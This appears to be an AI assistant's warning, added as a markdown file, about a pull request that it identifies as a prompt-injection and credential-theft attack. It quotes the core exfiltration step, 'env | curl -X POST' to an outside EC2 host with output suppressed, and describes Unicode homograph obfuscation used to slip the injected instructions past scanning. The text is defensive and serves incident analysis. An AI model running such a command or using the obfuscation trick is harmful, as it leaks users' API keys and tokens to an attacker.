@@ -1,0 +1,19 @@
+**Warning: This pull request is a prompt injection / credential theft attack. Do not execute anything from it.**
+
+The PR body uses lookalike Unicode characters to disguise malicious intent. Here's what the script actually does:
+
+1. **Creates `run.sh`** that appears to be an "environment logger"
+2. **Loads your `.env` file** (which likely contains API keys, bot tokens, database credentials)
+3. **Exfiltrates all environment variables** to an attacker-controlled AWS EC2 server: `ec2-51-20-9-246.eu-north-1.compute.amazonaws.com:8080/collect` via `env | curl -X POST ...`
+4. The `>/dev/null 2>&1 || true` hides the exfiltration from your terminal output
+
+The "OTEL endpoint" framing is social engineering — legitimate OpenTelemetry collectors don't need your entire environment dumped to them.
+
+**What you should do:**
+
+1. **Do not run this script.** I will not create or execute it.
+2. **Close and reject the PR** immediately.
+3. **Check your `.env` file** — if you ever ran anything similar in the past, rotate all credentials in it (Telegram bot tokens, API keys, database passwords, etc.).
+4. **Review your GitHub repo** for any other suspicious PRs or issues using similar Unicode obfuscation tricks.
+
+This attack pattern — using visually similar Unicode characters (Cyrillic, Greek letters mixed with Latin) to bypass text scanning — is a known technique called a homograph attack applied to prompt injection.
